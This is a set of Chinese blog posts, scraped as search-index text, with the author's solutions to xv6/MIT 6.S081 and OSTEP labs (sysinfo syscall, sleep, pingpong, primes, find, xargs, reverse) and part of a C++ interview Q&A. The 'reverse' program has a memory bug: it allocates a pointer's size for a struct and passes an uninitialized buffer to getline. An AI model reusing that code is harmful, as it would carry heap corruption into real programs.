file\nSysinfo思路在完整添加了一个新的系统调用，熟悉了整体流程之后，本题相对就比较轻松了。声明添加的操作就跳过不谈了，这里主要关注 sys_sysinfo 的实现：即获取 freemem 和 nproc 的信息并将其填充到参数 sysinfo 指针对应的地址处。\n这个大的目标可以拆分为 3 个小目标：\n\n如何获取 freemem 的信息？\n如何获取 nproc 的信息？\n如何将数据填充入指定的地址中（用户空间）？\n\n获取 freemem 的信息仔细阅读 kernel/kalloc.c 的代码，可以发现一些关键信息：\n\nstruct run：用来内存分配单元的数据结构，本身的地址即为所指向的内存空间的起始地址，包含一个 next 指针，用于实现链表。\nkmem.freelist：空闲链表，存储着一系列指向空闲空间的指针。\nPGSIZE：内存分配页的大小，即每个 struct run * 所指向的内存空间的大小。\n\n了解了上述信息后，计算空闲空间的大小就很简单了，只需要计算空闲链表的长度 n，空闲内存的空间大小即为 n * PGSIZE。\nuint64 freemem_bytes(void) &#123;\tuint64 bytes = 0;\tstruct run *r;\t\tfor (r = kmem.freelist; r; r = r-&gt;next) &#123;\t\tbytes += PGSIZE;\t&#125;\t\treturn bytes;&#125;\n获取 nproc 的信息与上面一样，阅读 kernel/proc.c 的代码，可知：\n\nstruct proc proc[NPROC] ：进程数组，存储着所有进程的 struct proc.\nUNUSED：struct proc 中 enum procstate 的类型之一，代表本 struct proc 未被使用。\n\n那么要得到当前系统中进程的数量，只需要遍历整个 proc，计算未处于 UNUSED 状态的进程数量即可。\nuint64 proc_num(void) &#123;\tstruct proc *p;\tuint64 num = 0;  \tfor(p = proc; p &lt; &amp;proc[NPROC]; ++p) &#123;\t\tnum += (p-&gt;state != UNUSED);\t&#125;\t\treturn num;&#125;\n将数据填充入指定的地址中得到 freemem 和 nproc 之后，就需要将数据写入 sysinfo 的参数 struct sysinfo * 指向的内存区域，获取参数的方法和 tracing 类似，不过由于参数是指针类型，因此采用 argaddr。最后，仿照 kernel/file.c 中的操作，使用 copyout 将内核区域的数据写入用户空间中。\nuint64 sys_sysinfo(void) &#123;\tstruct proc *p = myproc();\tstruct sysinfo info;\tuint64 addr;\t\tinfo.freemem = freemem_bytes();\tinfo.nproc = proc_num();\t\t// get argument addr\tif (argaddr(0, &amp;addr) &lt; 0) &#123;\t\treturn -1;\t&#125;\t\t// copy data of info to addr\tif (copyout(p-&gt;pagetable, addr, (char *)&amp;info, sizeof(info)) &lt; 0) &#123;\t\treturn -1;\t&#125;\t\treturn 0;&#125;\n代码diff --git a/Makefile b/Makefileindex 6647da5..cfb5119 100644--- a/Makefile+++ b/Makefile@@ -194,6 +194,7 @@ UPROGS=\\ \t$U/_wc\\ \t$U/_zombie\\ \t$U/_trace\\+\t$U/_sysinfotest\\   diff --git a/kernel/defs.h b/kernel/defs.hindex 3564db4..b2dbb8d 100644--- a/kernel/defs.h+++ b/kernel/defs.h@@ -63,6 +63,7 @@ void            ramdiskrw(struct buf*); void*           kalloc(void); void            kfree(void *); void            kinit(void);+uint64          freemem_bytes(void); // here  // log.c void            initlog(int, struct superblock*);@@ -104,6 +105,7 @@ void            yield(void); int             either_copyout(int user_dst, uint64 dst, void *src, uint64 len); int             either_copyin(void *dst, int user_src, uint64 src, uint64 len); void            procdump(void);+uint64          proc_num(void); // here  // swtch.S void            swtch(struct context*, struct context*);diff --git a/kernel/kalloc.c b/kernel/kalloc.cindex fa6a0ac..686d84e 100644--- a/kernel/kalloc.c+++ b/kernel/kalloc.c@@ -80,3 +80,15 @@ kalloc(void)     memset((char*)r, 5, PGSIZE); // fill with junk   return (void*)r; &#125;++// here+uint64 freemem_bytes(void) &#123;+\tuint64 bytes = 0;+\tstruct run *r;+\t+\tfor (r = kmem.freelist; r; r = r-&gt;next) &#123;+\t\tbytes += PGSIZE;+\t&#125;+\t+\treturn bytes;+&#125;\\ No newline at end of filediff --git a/kernel/proc.c b/kernel/proc.cindex f4bd5c2..ed6eec4 100644--- a/kernel/proc.c+++ b/kernel/proc.c@@ -657,3 +657,15 @@ procdump(void)     printf(&quot;\\n&quot;);   &#125; &#125;++// here+uint64 proc_num(void) &#123;+\tstruct proc *p;+\tuint64 num = 0;+  +\tfor(p = proc; p &lt; &amp;proc[NPROC]; ++p) &#123;+\t\tnum += (p-&gt;state != UNUSED);+\t&#125;+\t+\treturn num;+&#125;\\ No newline at end of filediff --git a/kernel/syscall.c b/kernel/syscall.cindex b5b8291..6fed4f2 100644--- a/kernel/syscall.c+++ b/kernel/syscall.c@@ -105,6 +105,7 @@ extern uint64 sys_wait(void); extern uint64 sys_write(void); extern uint64 sys_uptime(void); extern uint64 sys_trace(void);+extern uint64 sys_sysinfo(void);  static uint64 (*syscalls[])(void) = &#123; [SYS_fork]    sys_fork,@@ -129,6 +130,7 @@ static uint64 (*syscalls[])(void) = &#123; [SYS_mkdir]   sys_mkdir, [SYS_close]   sys_close, [SYS_trace]   sys_trace,+[SYS_sysinfo] sys_sysinfo, &#125;;  // here@@ -137,7 +139,7 @@ static char *syscall_names[] = &#123; \t&quot;read&quot;,   &quot;kill&quot;,  &quot;exec&quot;,  &quot;fstat&quot;, &quot;chdir&quot;, \t&quot;dup&quot;,    &quot;getpid&quot;,&quot;sbrk&quot;,  &quot;sleep&quot;, &quot;uptime&quot;, \t&quot;open&quot;,   &quot;write&quot;, &quot;mknod&quot;, &quot;unlink&quot;, &quot;link&quot;,-\t&quot;mkdir&quot;,  &quot;close&quot;, &quot;trace&quot;,+\t&quot;mkdir&quot;,  &quot;close&quot;, &quot;trace&quot;, &quot;sysinfo&quot;, &#125;;  voiddiff --git a/kernel/syscall.h b/kernel/syscall.hindex 756d191..7954d98 100644--- a/kernel/syscall.h+++ b/kernel/syscall.h@@ -20,4 +20,5 @@ #define SYS_link   19 #define SYS_mkdir  20 #define SYS_close  21-#define SYS_trace  22 // here\\ No newline at end of file+#define SYS_trace  22 // here+#define SYS_sysinfo 23\\ No newline at end of filediff --git a/kernel/sysproc.c b/kernel/sysproc.cindex 3ff51d9..644638f 100644--- a/kernel/sysproc.c+++ b/kernel/sysproc.c@@ -6,6 +6,7 @@ #include &quot;memlayout.h&quot; #include &quot;spinlock.h&quot; #include &quot;proc.h&quot;+#include &quot;sysinfo.h&quot;  uint64 sys_exit(void)@@ -101,5 +102,26 @@ uint64 sys_trace(void) &#123; \tif (argint(0, &amp;(myproc()-&gt;mask)) &lt; 0) &#123; \t\treturn -1; \t&#125;+\treturn 0;+&#125;++uint64 sys_sysinfo(void) &#123;+\tstruct proc *p = myproc();+\tstruct sysinfo info;+\tuint64 addr;+\t+\tinfo.freemem = freemem_bytes();+\tinfo.nproc = proc_num();+\t+\t// get argument addr+\tif (argaddr(0, &amp;addr) &lt; 0) &#123;+\t\treturn -1;+\t&#125;+\t+\t// copy data of info to addr+\tif (copyout(p-&gt;pagetable, addr, (char *)&amp;info, sizeof(info)) &lt; 0) &#123;+\t\treturn -1;+\t&#125;+\t \treturn 0; &#125;\\ No newline at end of filediff --git a/user/user.h b/user/user.hindex 16107d6..37d15a5 100644--- a/user/user.h+++ b/user/user.h@@ -1,5 +1,6 @@ struct stat; struct rtcdate;+struct sysinfo; // here  // system calls int fork(void);@@ -24,6 +25,7 @@ char* sbrk(int); int sleep(int); int uptime(void); int trace(int); // here+int sysinfo(struct sysinfo *);  // ulib.c int stat(const char*, struct stat*);diff --git a/user/usys.pl b/user/usys.plindex 76c64ec..fde7c87 100755--- a/user/usys.pl+++ b/user/usys.pl@@ -36,4 +36,5 @@ entry(&quot;getpid&quot;); entry(&quot;sbrk&quot;); entry(&quot;sleep&quot;); entry(&quot;uptime&quot;);-entry(&quot;trace&quot;); # here\\ No newline at end of file+entry(&quot;trace&quot;); # here+entry(&quot;sysinfo&quot;)\\ No newline at end of file\n","categories":["操作系统"],"tags":["操作系统","经验","xv6"]},{"title":"OSTEP Projects：Reverse","url":"/2024/05/06/OSTEP%20Projects%EF%BC%9AReverse/","content":"本文将介绍操作系统导论（Operating Systems: Three Easy Pieces）作者所开源的操作系统相关课程项目 的 Reverse 部分，包含个人的代码实现和设计思路。\n\n思路题目的要求很简单：按行读取数据，读取完成后将所读取到的所有行反向输出（行间反向，行内不变）。但代码实现上却包含不少细节。\n首先是核心问题：如何将读取到行反向输出？首先可以确定的一点是：在所有行读取完成之前，读取到的每一个行都需要进行保存。那么，利用什么数据结构进行保存呢？我们需要这个数据结构能够确定输入的不同行之间的前后相对关系，因此想到使用线性表。由于最终读取到的行数是不确定的，因此不能使用一个固定大小的数组，而应该使用可变长的线性表，如链表、动态数组。而又因为可变数组的扩容操作比较耗时，且我们并不需要对元素进行随机访问，只需要最后输出的时候进行顺序遍历，因此链表就成为了最佳选择。\n反转的具体实现可以参考经典问题反转链表，设定一个前驱结点 pre 和当前结点 cur，每次读取到新的行，就动态申请存储该行数据的内存空间，并将 cur 指向这块内存空间，然后将 cur 的 next 域指向 pre，然后 pre 再指向 cur，以便进行下一行的操作。\n根据 README 的说明，当输入文件和输出文件是同一个文件时，程序打印相关错误信息并退出。这里一个简单的想法是使用 strcmp(argv[1], argv[2]) 判断两个参数字符串是否相同，但文件路径的表示方式并不是唯一的，如 ./t1.txt 和 t1.txt 字符串不同，但表示的却是同一个文件。一个正确的做法是使用 stat() 函数，用以获取文件的状态信息，并对比输入与输出文件的状态信息是否相同。\n最后，输入输出部分代码的实现可以封装为一个函数，并引入参数 FILE*，其中标准输入（stdin）和标准输出（stdout）可以看作是一个抽象的文件，并使用 fprintf() 进行文件写入。\n代码#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/stat.h&gt;typedef struct LineNode &#123;\tchar* line_buf;\tstruct LineNode* next;&#125; line_node;// 判断两个路径是否表示同一个文件int is_same_file(const char* file1, const char* file2) &#123;\tstruct stat sb1, sb2;\tstat(file1, &amp;sb1);\tstat(file2, &amp;sb2);\treturn sb1.st_dev == sb2.st_dev &amp;&amp; sb1.st_ino == sb2.st_ino; // 设备ID和inode号均相同&#125;// 从文件fp中读取行数据line_node* read_from_file(FILE* fp) &#123;\tsize_t sz = 0;\tline_node* cur = NULL; // 当前结点\tline_node* pre = NULL; // 前置结点\twhile (1) &#123;\t\tcur = (line_node*)malloc(sizeof(line_node*));\t\tif (cur == NULL) &#123;\t\t\tfprintf(stderr, &quot;malloc failed\\n&quot;);\t\t\texit(1);\t\t&#125;\t\tif (getline(&amp;(cur-&gt;line_buf), &amp;sz, fp) == -1) &#123; // 读到文件末尾，删去当前无效结点并结束循环\t\t\tline_node* temp = cur;\t\t\tcur = pre;\t\t\tfree(temp);\t\t\tbreak;\t\t&#125;\t\tcur-&gt;next = pre; // 链表反转\t\tpre = cur;\t&#125;\treturn cur;&#125;// 写入反转后的数据到文件fpvoid write_to_file(line_node* cur, FILE* fp) &#123;\twhile (cur != NULL) &#123;\t\tfprintf(fp, &quot;%s&quot;, cur-&gt;line_buf);\t\tline_node* temp = cur;\t\tcur = cur-&gt;next;\t\tfree(temp);\t&#125;&#125;int main(int argc, char* argv[]) &#123;\tline_node* cur = NULL;\t\tif (argc == 1) &#123;\t\tcur = read_from_file(stdin);\t\twrite_to_file(cur, stdout);\t&#125;\telse if (argc &gt;= 2 &amp;&amp; argc &lt;= 3) &#123;\t\tFILE* fp = fopen(argv[1], &quot;r&quot;);\t\tif (fp == NULL) &#123;\t\t\tfprintf(stderr, &quot;reverse: cannot open file &#x27;%s&#x27;\\n&quot;, argv[1]);\t\t\texit(1);\t\t&#125;\t\tcur = read_from_file(fp);\t\t\t\tif (argc == 2) &#123;\t\t\twrite_to_file(cur, stdout);\t\t&#125;\t\telse &#123;\t\t\tFILE* fp2 = fopen(argv[2], &quot;w&quot;);\t\t\tif (fp2 == NULL) &#123;\t\t\t\tfprintf(stderr, &quot;reverse: cannot open file &#x27;%s&#x27;\\n&quot;, argv[2]);\t\t\t\texit(1);\t\t\t&#125;\t\t\tif (is_same_file(argv[1], argv[2])) &#123;\t\t\t\tfprintf(stderr, &quot;reverse: input and output file must differ\\n&quot;);\t\t\t\texit(1);\t\t\t&#125;\t\t\twrite_to_file(cur, fp2);\t\t\tfclose(fp2);\t\t&#125;\t\tfclose(fp);\t&#125;\telse &#123;\t\tfprintf(stderr, &quot;usage: reverse &lt;input&gt; &lt;output&gt;\\n&quot;);\t\texit(1);\t&#125;\treturn 0;&#125;\n","categories":["操作系统"],"tags":["操作系统","C","Linux"]},{"title":"MIT6.s081 2021 Lab Utilities","url":"/2024/06/24/MIT6.s081-2021-Lab%20Utilities/","content":"Boot xv6按照示例切换到 util 分支后，看到目录下包含 Makefile 文件，执行 make qemu 即可。\nsleep思路借助系统调用 sleep 实现一个命令行程序，关键是要找到封装了系统调用的 C 函数的位置，根据提示：\n\n… user/user.h for the C definition of sleep callable from a user program …\n\n可知该函数的声明位于 user.h 头文件中，声明方式很简单：\nint sleep(int);\n将其“拷贝”（include）到需要编写的代码 user/sleep.c 中，调用 sleep(&lt;睡眠时间&gt;) 即可。\n最后，按照提示，将编写的 sleep 代码添加到 Makefile 的 UPROGS 中，添加后如下所示：\nUPROGS=\\    $U/_cat\\    $U/_echo\\    $U/_forktest\\    $U/_grep\\    $U/_init\\    $U/_kill\\    $U/_ln\\    $U/_ls\\    $U/_mkdir\\    $U/_rm\\    $U/_sh\\    $U/_stressfs\\    $U/_usertests\\    $U/_grind\\    $U/_wc\\    $U/_zombie\\    $U/_sleep\\\n代码// user/sleep.c#include &quot;kernel/types.h&quot; // 注意先包含types.h#include &quot;user/user.h&quot;    // 再包含user.h（user.h中存在在types.h中定义的别名）int main(int argc, char* argv[]) &#123;    if (argc != 2) &#123;        fprintf(2, &quot;sleep: argument count error\\n&quot;);        exit(1);    &#125;    int time = atoi(argv[1]);    sleep(time);    exit(0);&#125;\npingpong思路本题主要是要理解管道的接口设计，以及借助该接口实现父进程与子进程之间的通信。这是 xv6 文档中对于 pipe 调用的描述：\nint pipe(int p[]) // Create a pipe, put read/write file descriptors in p[0] and p[1].\npipe 创建一个管道，并分别将该管道的读、写端文件描述符置为 p[0] 和 p[1]，之后调用 fork 创建一个子进程，由于 fork 的作用是将父进程的数据直接拷贝给子进程，因此子进程同时继承了父进程的管道文件描述符，可以借助该文件描述符进行进程间通信（IPC），相当于借助一个共享文件进行通信，只不过该“文件”存储在内存的内核区域中，而不占用实际的磁盘存储空间。\n利用管道解决本题的基本流程如下，首先需要创建两个管道 pa 和 pb，然后：\n\n父进程向管道 pa 的写端写入 1 字节数据，然后关闭 pa 的写端。\n子进程从管道 pa 的读端读取 1 字节数据，然后关闭 pa 的读端，打印信息，然后向管道 pb 的写端写入 1 字节数据，关闭 pb 的写端。\n父进程从管道 pb 的读端读取 1 字节数据，关闭 pb 的读端，最后打印信息。\n\n这里需要解释一下为什么需要两个管道（只是个人的方法，其它方法可能只需要一个管道），由于进程调度策略的影响，父进程和子进程的执行顺序并不确定。可能出现这样一种情况：在 fork 创建子进程后，父进程先被调度，将 1 字节数据写入管道，这时理想的情况是子进程被调度，然后读取父进程发送的数据，但是事实可能并不会如我们所愿，子进程可能一直得不到调度，父进程继续向下执行，从管道中读取自己刚刚发送的 1 字节的数据，这样子进程就无法收到父进程发送的数据，父子进程之间的通信也就失败了。\n通过创建两个管道，并分别关闭对应的读端和写端，就能够得到两个单向数据流的管道，也就不会有上述自己写入的数据被被自己读取的情况出现。\n代码// user/pingpong.c#include &quot;kernel/types.h&quot;#include &quot;user/user.h&quot;int main(int argc, char* argv[]) &#123;\tchar buf[2];\tint pa[2], pb[2];\tpipe(pa);\tpipe(pb);\tint pid = fork();\tif (pid == 0) &#123;\t\tclose(pa[1]);\t\tclose(pb[0]);\t\t// phase_2\t\tread(pa[0], buf, 1);\t\tclose(pa[0]);\t\tprintf(&quot;%d: received ping\\n&quot;, getpid());\t\twrite(pb[1], &quot;a&quot;, 1);\t\tclose(pb[1]);\t&#125;\telse if (pid &gt; 0) &#123;\t\tclose(pa[0]);\t\tclose(pb[1]);\t\t// phase_1\t\twrite(pa[1], &quot;a&quot;, 1);\t\tclose(pa[1]);\t\t// phase_3\t\tread(pb[0], buf, 1);\t\tclose(pb[0]);\t\tprintf(&quot;%d: received pong\\n&quot;, getpid());\t&#125;\telse &#123;\t\tfprintf(2, &quot;pingpong: fork failed\\n&quot;);\t\texit(1);\t&#125;\texit(0);&#125;\nprimes思路实现一个基于管道的并发埃式筛（The sieve of Eratosthenes），关键是要理解管道的机制，以及仔细阅读题干给出的文章，该文章有关该埃式筛方法的介绍图片如下所示：\n\n该算法的个人感觉十分精妙，以下是基本流程：\n\n进程 0（主进程）发出一系列从 2 开始的整数序列。\n进程 1 首先接收来自进程 0 发出的第一个整数 prime，prime 一定是一个质数，将其打印出来。然后继续按顺序接收来自进程 0 发出的其它整数，若接收到的某个整数能够被 prime 整除，则丢弃它（不做处理），否则将该整数发送给下一个进程。\n后续进程的操作与进程 1 类似，直到没有任何整数发送给下一个进程，程序终止。\n\n算法的思路并不复杂，主要问题在于如何使用管道实现上述流程中进程 i 与进程 i + 1 之间的通信。我这里只使用了一个 int[2] 来轮换地存放管道的文件描述符，并使用一个缓冲区来暂存每次要发送给下一个进程的数，在一个进程完成它所做的工作后，再将缓冲区中的数据批量写入管道，并创建子进程来完成接下来的工作。这里要千万注意管道完成读取或写入后及时关闭，否则可能会出现子进程读取管道时阻塞的情况。\n我在写下这篇博客的过程中发现，虽然我使用的这个方法能够达到预期的效果，并成功通过测试用例，但是其实是有一定问题的：本方法的处理过程是串行的。事实上，每个进程都是在将本进程的所有工作全部完成之后，再调用 fork 来创建子进程，完成后续的工作，本质上与放在一个进程中完成所有工作并没有区别，与文章中提到的 “Concurrent” 完全相悖。理想的做法应该是创建一个 int[2] 数组来存放管道的文件描述符，并及时 fork 子进程来工作，以此来实现并发，具体的代码实现有待后续改进。\n代码// user/primes.c#include &quot;kernel/types.h&quot;#include &quot;user/user.h&quot;int main(int argc, char* argv[]) &#123;\tint p[2];\tpipe(p);\tint buf;\tint plist[35];\tfor (int i = 2; i &lt;= 35; ++i) &#123;\t\twrite(p[1], (char*)&amp;i, 4);\t&#125;\tclose(p[1]);\twhile (read(p[0], (char*)&amp;buf, 4)) &#123;\t\tint prime = buf;\t\tprintf(&quot;prime %d\\n&quot;, prime);\t\tint pcnt = 0;\t\twhile (read(p[0], (char*)&amp;buf, 4)) &#123;\t\t\tif (buf % prime) &#123;\t\t\t\tplist[pcnt++] = buf;\t\t\t&#125;\t\t&#125;\t\tclose(p[0]);\t\tpipe(p); // rotating pipe\t\tfor (int i = 0; i &lt; pcnt; ++i) &#123;\t\t\twrite(p[1], (char*)(plist + i), 4);\t\t&#125;\t\tclose(p[1]);\t\tint pid = fork();\t\tif (pid == 0) &#123;\t\t\tcontinue;\t\t&#125;\t\telse if (pid &gt; 0) &#123;\t\t\twait(0);\t\t\texit(0);\t\t&#125;\t\telse &#123;\t\t\tfprintf(2, &quot;primes: fork error\\n&quot;);\t\t\texit(1);\t\t&#125;\t&#125;\texit(0);&#125;\nfind思路本题是这个 Lab 中我花费时间最长的，代码思路虽然不算很复杂，但是有很多的细节问题我在写的时候没有考虑到，感觉 debug 时间差不多是 coding 的几倍了。。。\n题目要求实现一个简易的 find 命令，根据提示可以参考 user/ls.c 对目录的读取操作，并使用递归来实现对子目录的查找。基本思路就是打开一个指定路径的文件（目录也算是特殊的文件），并根据文件的类型做不同处理：\n\n如果文件是常规文件，则判断改文件名是否是目标文件名（find 的第二个参数），如果是，则将其完整路径打印至标准输出。\n如果文件是目录文件，则读取该目录下的所有文件名，并在该目录路径尾部加上 /st.name，依次构造一个新的文件名继续递归调用 find。注意不要递归进入 . 和 ..，否则将导致无限递归。 \n\n以上便是基本思路，具体实现可以阅读完整代码，下面讲一下我遇到的一些问题（bug）：\n\n使用 fstat 获取文件信息时 st.type 始终为 3（T_DEVICE 类型）。\n\n这个问题其实挺难绷的，原因是我把 if ((fd = open(path, 0)) &lt; 0) 写成了 if ((fd = open(path, 0) &lt; 0))，因为 &lt; 的优先级大于 =，所以导致 fd 的值始终为 0 或 1（逻辑表达式的值只能为真或假），那么后续产生意想不到的结果也就不意外了。。。\n\n出现 find: cannot open file ./sh ，之后所有文件均打开失败\n\n在打印出文件描述符的值后，问题的起因比较明显了。\n\n文件描述符一直在增大，最终文件打开失败，open 返回 -1。很明显，是因为文件在打开后没有及时关闭，并释放文件描述符，最终文件描述符被全部占用，新的文件无法再被打开。这也解释了既然程序退出后，所有打开的文件会自动关闭，为什么还要建议手动关闭文件的问题。\n\n读取到空文件名\n\n前面的问题解决之后，我发现程序仍然会出现无限递归搜索的情况（如下图所示），按理说我已经对文件名进行了判断，如果是 . 或者 .. 则不做处理。\n\n尝试打印文件名之后，我发现目录的最后一个文件名为空，这样的空文件名将导致程序不断往其末尾追加斜杠 / 而并没有递归进入该目录中。\n\n事实上，使用 read 读取目录时，在读取目录的所有条目之后，会返回一个空的 dirent 结构体，此时 de.name 为空，作为循环结束的标志。其实 user/ls.c 有针对这个特性的判断，不过当时 coding 的时候没有细看。所以正如 Lab guidance 中所说：\n\nOnly when you have a firm grasp of the assignment and solution, then start coding.\n\n代码// user/find.c#include &quot;kernel/types.h&quot;#include &quot;kernel/stat.h&quot;#include &quot;kernel/fs.h&quot;#include &quot;user/user.h&quot;char* file_name(char* path) &#123;\tchar* p;\tfor (p = path + strlen(path); p &gt;= path &amp;&amp; *p != &#x27;/&#x27;; --p);\t++p;\treturn p;&#125;void find(char* path, char* target) &#123;\tint fd;\tstruct dirent de;\tstruct stat st;\tchar buf[512];\tchar* name, * p;\tif ((fd = open(path, 0)) &lt; 0) &#123;\t\tfprintf(2, &quot;find: cannot open file %s\\n&quot;, path);\t\treturn;\t&#125;\tif (fstat(fd, &amp;st) &lt; 0) &#123;\t\tfprintf(2, &quot;find: cannot stat file %s\\n&quot;, path);\t\tclose(fd);\t\treturn;\t&#125;\tswitch (st.type) &#123;\tcase T_FILE:\t\tname = file_name(path);\t\tif (!strcmp(name, target)) &#123;\t\t\tprintf(&quot;%s\\n&quot;, path);\t\t&#125;\t\tbreak;\tcase T_DIR:\t\twhile (read(fd, &amp;de, sizeof(de)) == sizeof(de)) &#123;\t\t\t// prevent infinite recursion\t\t\tif (!de.inum || !strcmp(de.name, &quot;.&quot;) || !strcmp(de.name, &quot;..&quot;)) &#123;\t\t\t\tcontinue;\t\t\t&#125;\t\t\t// generate path of sub directory\t\t\tstrcpy(buf, path);\t\t\tp = buf + strlen(buf);\t\t\t*p++ = &#x27;/&#x27;;\t\t\tmemmove(p, de.name, DIRSIZ);\t\t\tp[DIRSIZ] = 0;\t\t\tfind(buf, target);\t\t&#125;\t\tbreak;\tdefault:\t\tbreak;\t&#125;\tclose(fd);&#125;int main(int argc, char* argv[]) &#123;\tif (argc != 3) &#123;\t\tfprintf(2, &quot;find: argument count error\\n&quot;);\t\texit(1);\t&#125;\tfind(argv[1], argv[2]);\texit(0);&#125;\nxargs思路相较于 find，xargs 的实现就简单很多了。由于之前自己实现过一个简单的 shell，因此对于 exec 系统调用还算比较熟悉，本题的主要内容就是根据 argv 和标准输入构造一个新的参数列表，作为指定命令行程序的参数，并使用 exec 来进行调用。\n程序的流程比较简单，这里不过多介绍，直接查看完整代码即可。\n代码// user/xargs.c#include &quot;kernel/types.h&quot;#include &quot;user/user.h&quot;#include &quot;kernel/param.h&quot;int main(int argc, char* argv[]) &#123;\tint i;\tchar buf[512];\tchar* nargv[MAXARG];\twhile (gets(buf, MAXARG)) &#123;\t\tbuf[strlen(buf) - 1] = 0; // remove last &#x27;\\n&#x27;\t\tfor (i = 1; argv[i]; ++i) &#123;\t\t\tnargv[i - 1] = argv[i];\t\t&#125;\t\tnargv[i - 1] = buf;\t\tnargv[i] = 0;\t\tint pid = fork();\t\tif (pid == 0) &#123;\t\t\texec(argv[1], nargv);\t\t&#125;\t\telse if (pid &gt; 0) &#123;\t\t\twait(0);\t\t&#125;\t\telse &#123;\t\t\tfprintf(2, &quot;xargs: fork error\\n&quot;);\t\t\texit(1);\t\t&#125;\t&#125;\texit(0);&#125;\n","categories":["操作系统"],"tags":["操作系统","经验","xv6"]},{"title":"C++面试题总结","url":"/2023/03/07/C++%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93/","content":"由于考研失利，最近在准备春招，想要找一份游戏客户端开发的岗位，便想要将 C++ 常见的面试题整理出来。题目来自牛客网的 C++ 面试题库，答案结合了牛客网给出的参考答案、new bing 给出的回答以及个人的理解和思考。\n\nC++ 和 C 中 struct 的区别，以及 C++ 中 struct 和 class 的区别C++ 和 C 中 struct 的区别\nC 中 struct 只能定义成员变量，不能定义成员函数，而 C++ 中 struct 可以定义成员函数，甚至构造函数，析构函数，友元等。\nC 中 struct 内的成员变量不可以直接初始化，而 C++ 中可以。\nC 中使用结构体需要加上 struct 关键字，或者使用 typedef 对结构体取别名后再直接使用其别名，而 C++ 使用结构体则可以直接忽略 struct 关键字。\n\nC++ 中 struct 和 class 的区别\nclass 的成员默认是 private 的，而 struct 的成员默认是 public 的。\nclass 继承默认是 private 继承，而 struct 继承默认是 public 继承。\n\nstatic 关键字的作用\nstatic 可以修饰全局变量和函数，使它们只在本文件内可见，隐藏于其他文件。\nstatic 可以修饰局部变量，使它们具有静态存储期，只初始化一次，且在函数调用结束后不销毁。\nstatic 可以修饰类的成员变量和成员函数，使它们属于类而不属于对象，可以直接通过类名访问，且只有一份内存空间。\n\n什么是野指针，怎么产生，如何避免什么是野指针野指针是指指向不可用内存的指针，可能会导致内存泄漏和程序崩溃。\n野指针如何产生\n指针定义时未被初始化，指向随机的内存地址。\n使用 delete 释放内存空间后指针未被置空，指向已释放的内存地址。\n数组越界，指向非法的内存地址。\n\n野指针如何避免\n指针定义时尽量初始化，或者赋值为 nullptr。\n使用 delete 释放内存空间后要将指针及时置空，或者使用智能指针。\n指针操作时注意边界检查，避免越界。\n\nC 和 C++ 的区别\nC 是一种面向过程的语言，而 C++ 是一种面向对象的语言，支持类和对象的概念。\nC++ 包含了 C 的大部分语法，同时增加了一些新的特性，如继承、多态、模板、异常处理等。\nC 使用 malloc 和 free 函数进行内存的动态分配和释放，C++ 则使用 new 和 delete 运算符。\nC 只有局部和全局两个作用域，而 C++ 中有局部、全局、类、命名空间。\n\n使用 const 和 define 定义常量的区别\nconst 定义的常量是变量，带有数据类型，而 define 定义的常量是预处理器替换的文本，不带数据类型。\nconst 定义的常量在编译运行时起作用，可以进行调试，而 define 定义的常量在预处理阶段起作用，不能进行调试。\nconst 定义的常量可以进行作用域限制，而 define 定义的常量没有作用域的概念。\nconst 定义的常量可以进行类型检查，而 define 定义的常量不能进行类型检查。\n\nextern 的作用，extern 变量在内存的哪个数据段，为什么要 extern Cextern 的作用extern 是 C 语言的关键字，用来引用不在同一个文件的变量或函数。\nextern 变量存储在在内存的哪个数据段extern 修饰一个变量，表明该变量是一个外部变量，也就是全局变量，因此存储在内存的静态存储区（全局区），也就是说它的生命周期是整个程序的运行周期。\n为什么要 extern Cextern C 的作用是用来在 C++ 程序中调用 C 的函数，由于 C++ 支持函数重载，因此 C++ 的函数名会经过编译器的修饰，而 C 的函数名不会，因此需要用 extern C 来告诉编译器按照 C 的方式来处理函数名。\nconst 关键字的用法\n用来修饰指针变量，防止修改指针指向的内容或地址。\n用来修饰变量，使得该变量的值在初始化后不能被修改。\n用来修饰类的成员函数，使得函数不能修改类的成员变量。\n\n各类型的 sizeof() 是多少，指针的 sizeof() 是多少，sizeof() 实现原理各类型的 sizeof() 值不同环境下各类型的 sizeof() 可能不同，这取决于机器和编译器，以下为 MSVC 32 bit 环境下各类型大小。\n\n\n\n\ntype\nsize\n\n\n\n\nbool\n1B\n\n\nchar\n1B\n\n\nint\n4B\n\n\nfloat\n4B\n\n\ndouble\n8B\n\n\n\n\n指针的 sizeof() 值由于指针存储的实质上是地址，因此它的大小取决于机器位数，在 32 位环境下为 4B，在 64 位环境下为 8B.\nsizeof() 实现原理sizeof() 是在编译期间，通过查找符号表，判断类型，然后根据基础类型来取值。对于基本数据类型，sizeof() 直接返回它们的固定大小；对于复合类型，如结构体类型，sizeof() 会考虑它们的内部结构和对齐方式，并返回它们的总大小。\nC 语言的 volatile 有什么用，可以和 const 同时使用吗volatile 的作用C 语言的 volatile 是一个修饰符，用来告诉编译器不要对 volatile 修饰的变量进行优化，而是每次都从内存中读取它的值。这是因为 volatile 变量可能会被外部因素改变，比如中断、硬件设备或者多线程。\n可以和 const 同时使用吗const 是另一个修饰符，用来声明一个只读变量。\nvolatile 和 const 可以同时使用，表示一个只读的但可能会被外部因素改变的变量。\nC++ 引用的概念\n引用是 C++ 相对于 C 语言的一个扩充。C++ 引用的概念是指一个变量的别名，也就是说，它是某个已存在变量的另一个名字，通过这个名字和原本的名字都可以找到其指定的数据。\n引用必须初始化，且初始化后不能改变其所绑定的对象。\n引用的本质是指针，底层实现还是指针。\n\n指针和引用的区别\n指针是一个变量，存储的是一个地址，指向内存的一个存储单元；引用是原变量的一个别名，与其引用的变量实质上是同一个东西。\n指针可以不初始化，也可以为空；引用必须初始化，且不能为空。\n指针可以改变指向；引用不能改变指向。\n指针可以有多级；引用只能有一级。\n指针作为函数参数传递时传递的是指针变量的值，而引用作为参数传递的是实参本身。\n\n内联函数的作用\n由于函数调用过程需要进行参数传递、上下文保存与恢复等操作，因此会引入时间与空间上的额外开销。通过编译器预处理，在调用内联函数的地方将内联函数内的语句复制到调用函数处，也就是直接展开代码执行，从而提高了效率，减少了不必要的开销。\n内联函数相比宏定义函数来说，有参数类型检查，执行更加安全。\n声明内联函数使用关键字 